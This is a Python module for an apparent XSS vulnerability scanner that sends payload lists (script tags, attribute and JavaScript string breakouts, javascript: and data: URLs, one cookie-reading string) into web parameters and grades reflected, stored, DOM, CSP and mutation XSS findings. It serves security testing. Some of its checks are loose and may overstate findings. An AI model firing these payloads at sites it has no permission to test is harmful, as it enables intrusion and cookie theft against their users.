import logging
import httpx
import asyncio
import re
import time
import json
import uuid
from typing import Optional
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse, quote

from backend.api.websocket import emit_finding, emit_tool_output

logger = logging.getLogger(__name__)

XSS_CONTEXTS = {
    "html_tag": [
        {"context": "html_tag", "payloads": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<math><mtext><table><mglyph><svg><mtext><textarea><path><textarea><path><x><textarea>",
        ]},
    ],
    "html_attribute": [
        {"context": "html_attribute", "payloads": [
            "\" onmouseover=\"alert(1)",
            "' onmouseover='alert(1)",
            "\" onfocus=alert(1) autofocus=\"",
            "\" onclick=alert(1) \"",
            "\" onerror=alert(1) \"",
            "x\" onmouseover=\"alert(1)",
            "x' onmouseover='alert(1)",
            "\" style=\"background:url(javascript:alert(1))",
        ]},
    ],
    "js_context": [
        {"context": "js_context", "payloads": [
            "';alert(1)//",
            "\";alert(1)//",
            "';alert(1)//",
            "';alert(document.cookie)//",
            "');alert(1)//",
            "\\';alert(1)//",
            "\"+alert(1)+\"",
            "`+alert(1)+`",
            "alert(1)",
            "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
        ]},
    ],
    "url_context": [
        {"context": "url_context", "payloads": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:alert(1)",
            "javascript:void(alert(1))",
        ]},
    ],
    "css_context": [
        {"context": "css_context", "payloads": [
            "background:url(javascript:alert(1))",
            "background-image:url('javascript:alert(1)')",
            "expression(alert(1))",
            "-moz-binding:url('javascript:alert(1)')",
            "behavior:url(#default#time2)alert(1)",
        ]},
    ],
}

CSP_BYPASS_PATTERNS = [
    r"unsafe-inline",
    r"unsafe-eval",
    r"unsafe-hashes",
    r"strict-dynamic",
    r"nonce-",
]

MXSS_PATTERNS = [
    r"toString\s*\(\s*\)",
    r"innerHTML",
    r"document\.write",
    r"eval\s*\(",
    r"setTimeout\s*\(",
    r"setInterval\s*\(",
]

DOM_XSS_SOURCES = [
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "location.href",
    "location.search",
    "location.hash",
    "window.name",
]

DOM_XSS_SINKS = [
    "eval(",
    "document.write(",
    "document.writeln(",
    "innerHTML",
    "outerHTML",
    "element.innerHTML",
    "document.body.innerHTML",
    "element.outerHTML",
    "$.html(",
    ".html(",
]


class XSSScanner:
    def __init__(self, timeout: int = 30, verify_ssl: bool = False):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self._findings = []

    async def scan(self, element: dict, payloads: list[dict]) -> list[dict]:
        findings = []
        url = element.get("url", "")
        param_name = element.get("parameter_name", "")
        method = element.get("http_method", "GET").upper()
        scan_id = element.get("scan_id", "")

        if not url or not param_name:
            return findings

        try:
            baseline = await self._get_baseline(url, method, param_name)
        except Exception as e:
            logger.error(f"XSS baseline failed for {url}: {e}")
            return findings

        for payload in payloads:
            subtype = payload.get("subtype", "reflected")
            context = payload.get("context", "html_tag")
            payload_str = payload.get("payload_string", "")

            if subtype == "reflected":
                result = await self._test_reflected(
                    url, method, param_name, payload_str, baseline, context
                )
            elif subtype == "stored":
                result = await self._test_stored(
                    url, method, param_name, payload_str, baseline, context
                )
            elif subtype == "dom":
                result = await self._test_dom_based(
                    url, method, param_name, payload_str, baseline
                )
            elif subtype == "csp_bypass":
                result = await self._test_csp_bypass(
                    url, method, param_name, payload_str, baseline
                )
            elif subtype == "mxss":
                result = await self._test_mxss(
                    url, method, param_name, payload_str, baseline
                )
            else:
                result = await self._test_reflected(
                    url, method, param_name, payload_str, baseline, context
                )

            if result:
                findings.append(result)

        self._findings = findings
        return findings

    async def _get_baseline(self, url: str, method: str, param_name: str) -> dict:
        start = time.time()
        async with httpx.AsyncClient(
            verify=self.verify_ssl, timeout=self.timeout, follow_redirects=True
        ) as client:
            if method == "GET":
                resp = await client.get(url)
            else:
                resp = await client.post(url, data={param_name: "baseline"})
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "body": resp.text,
                "body_length": len(resp.text),
                "response_time": elapsed,
                "headers": dict(resp.headers),
            }

    async def _send_payload(
        self, url: str, method: str, param_name: str, payload: str
    ) -> dict:
        start = time.time()
        try:
            async with httpx.AsyncClient(
                verify=self.verify_ssl, timeout=self.timeout, follow_redirects=True
            ) as client:
                if method == "GET":
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urlencode(params, doseq=True)
                    inject_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment,
                    ))
                    resp = await client.get(inject_url)
                else:
                    resp = await client.post(url, data={param_name: payload})
                elapsed = time.time() - start
                return {
                    "status_code": resp.status_code,
                    "body": resp.text,
                    "body_length": len(resp.text),
                    "response_time": elapsed,
                    "headers": dict(resp.headers),
                    "error": None,
                }
        except httpx.TimeoutException:
            return {"status_code": 0, "body": "", "body_length": 0, "response_time": time.time() - start, "headers": {}, "error": "timeout"}
        except Exception as e:
            return {"status_code": 0, "body": "", "body_length": 0, "response_time": time.time() - start, "headers": {}, "error": str(e)}

    def _check_xss_reflection(self, body: str, payload: str) -> dict:
        result = {"reflected": False, "context": "none", "sanitized": True, "details": []}
        escaped_chars = ["&lt;", "&gt;", "&quot;", "&#x27;", "&#39;", "&amp;"]
        payload_escaped = any(e in body for e in escaped_chars if e in payload)
        if payload in body:
            result["reflected"] = True
            result["sanitized"] = False
            result["context"] = "raw_reflection"
        elif payload.lower() in body.lower():
            result["reflected"] = True
            result["sanitized"] = False
            result["context"] = "case_insensitive_reflection"
        for esc in escaped_chars:
            if esc in body and esc in payload:
                result["reflected"] = True
                result["sanitized"] = True
                result["context"] = "html_escaped"
                result["details"].append(esc)
        return result

    def _check_csp_headers(self, headers: dict) -> dict:
        csp = headers.get("content-security-policy", "")
        bypass_info = {"has_csp": bool(csp), "bypass_possible": False, "directives": []}
        if csp:
            for pattern in CSP_BYPASS_PATTERNS:
                if re.search(pattern, csp, re.IGNORECASE):
                    bypass_info["bypass_possible"] = True
                    bypass_info["directives"].append(pattern)
        else:
            bypass_info["bypass_possible"] = True
        return bypass_info

    def _create_finding(
        self, title: str, description: str, severity: str, cvss: float,
        confidence: str, family: str, subtype: str, payload: str,
        request_data: dict, response_data: dict, evidence: dict
    ) -> dict:
        return {
            "id": str(uuid.uuid4()),
            "title": title,
            "description": description,
            "severity": severity,
            "cvss_score": cvss,
            "confidence": confidence,
            "injection_family": family,
            "injection_subtype": subtype,
            "payload": payload,
            "request_data": request_data,
            "response_data": response_data,
            "evidence_json": json.dumps(evidence),
        }

    async def _test_reflected(
        self, url: str, method: str, param_name: str, payload: str,
        baseline: dict, context: str
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        reflection = self._check_xss_reflection(body, payload)

        if reflection["reflected"] and not reflection["sanitized"]:
            csp = self._check_csp_headers(resp["headers"])
            severity = "high"
            confidence = "high"
            if csp["bypass_possible"]:
                severity = "critical"
                confidence = "high"
            elif csp["has_csp"]:
                severity = "medium"
                confidence = "medium"

            return self._create_finding(
                title="XSS - Reflected",
                description=f"Reflected XSS detected. Payload reflected without sanitization in {context} context.",
                severity=severity,
                cvss=7.4 if context == "html_tag" else 6.1,
                confidence=confidence,
                family="xss",
                subtype="reflected",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"], "body_length": resp["body_length"]},
                evidence={
                    "reflection_context": reflection["context"],
                    "sanitized": reflection["sanitized"],
                    "csp_bypass_possible": csp["bypass_possible"],
                    "csp_directives": csp["directives"],
                    "xss_context": context,
                },
            )

        if reflection["reflected"] and reflection["sanitized"]:
            return self._create_finding(
                title="XSS - Reflected (Sanitized)",
                description="Payload reflected but HTML entities encoded. Potential filter bypass possible.",
                severity="low",
                cvss=3.7,
                confidence="low",
                family="xss",
                subtype="reflected",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"]},
                evidence={"sanitized": True, "escaped_chars": reflection["details"]},
            )
        return None

    async def _test_stored(
        self, url: str, method: str, param_name: str, payload: str,
        baseline: dict, context: str
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        reflection = self._check_xss_reflection(body, payload)

        if reflection["reflected"] and not reflection["sanitized"]:
            return self._create_finding(
                title="XSS - Stored",
                description="Stored XSS potential detected. Payload persisted and reflected in response without sanitization.",
                severity="critical",
                cvss=9.1,
                confidence="medium",
                family="xss",
                subtype="stored",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"]},
                evidence={"reflection_context": reflection["context"], "xss_context": context},
            )
        return None

    async def _test_dom_based(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        body_lower = body.lower()

        # Check for definitive source->sink data flows within script blocks
        # We look for script tag contents and analyse them for dangerous patterns
        import re
        script_contents = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
        js_code = ' '.join(script_contents).lower()

        sources_found = [s for s in DOM_XSS_SOURCES if s.lower() in js_code]
        sinks_found = [s for s in DOM_XSS_SINKS if s.lower() in js_code]

        # Strong signal: source AND sink both appear in the same script block
        if sources_found and sinks_found:
            return self._create_finding(
                title="XSS - DOM-Based",
                description=(
                    f"DOM-based XSS: JavaScript on page reads from tainted source(s) "
                    f"({', '.join(sources_found[:3])}) and writes to dangerous sink(s) "
                    f"({', '.join(sinks_found[:3])}). Attacker can control data flow via URL."
                ),
                severity="high",
                cvss=7.4,
                confidence="medium",
                family="xss",
                subtype="dom",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"]},
                evidence={"sources": sources_found, "sinks": sinks_found},
            )

        # Weaker signal: check for hash-based DOM sinks (location.hash -> innerHTML etc.)
        if "location.hash" in js_code or "location[\"hash\"]" in js_code:
            hash_sinks = [s for s in DOM_XSS_SINKS if s.lower() in js_code]
            if hash_sinks:
                return self._create_finding(
                    title="XSS - DOM-Based (Hash Sink)",
                    description=(
                        f"DOM-based XSS via location.hash: page reads URL fragment "
                        f"and writes to dangerous sink(s): {', '.join(hash_sinks[:3])}. "
                        f"Attacker can inject via URL fragment (#payload)."
                    ),
                    severity="high",
                    cvss=7.0,
                    confidence="medium",
                    family="xss",
                    subtype="dom",
                    payload=payload,
                    request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                    response_data={"status_code": resp["status_code"]},
                    evidence={"hash_source": True, "sinks": hash_sinks},
                )
        return None

    async def _test_csp_bypass(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        csp = self._check_csp_headers(resp["headers"])
        body = resp["body"]
        reflection = self._check_xss_reflection(body, payload)

        if csp["bypass_possible"] and reflection["reflected"] and not reflection["sanitized"]:
            return self._create_finding(
                title="XSS - CSP Bypass",
                description=f"CSP bypass possible. No effective CSP or weak directives detected: {', '.join(csp['directives'][:3])}",
                severity="critical",
                cvss=9.1,
                confidence="high",
                family="xss",
                subtype="csp_bypass",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"]},
                evidence={"csp_bypass_possible": True, "directives": csp["directives"]},
            )

        if not csp["has_csp"] and reflection["reflected"] and not reflection["sanitized"]:
            return self._create_finding(
                title="XSS - No CSP",
                description="No Content-Security-Policy header present. Reflected payload detected without CSP protection.",
                severity="high",
                cvss=7.4,
                confidence="medium",
                family="xss",
                subtype="csp_bypass",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"]},
                evidence={"has_csp": False, "reflection": True},
            )
        return None

    async def _test_mxss(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        for pattern in MXSS_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                reflection = self._check_xss_reflection(body, payload)
                if reflection["reflected"]:
                    return self._create_finding(
                        title="XSS - Mutation XSS (mXSS)",
                        description=f"Mutation XSS pattern detected. DOM manipulation pattern found: {pattern}",
                        severity="critical",
                        cvss=9.1,
                        confidence="medium",
                        family="xss",
                        subtype="mxss",
                        payload=payload,
                        request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                        response_data={"status_code": resp["status_code"]},
                        evidence={"mxss_pattern": pattern, "reflection": True},
                    )
        return None
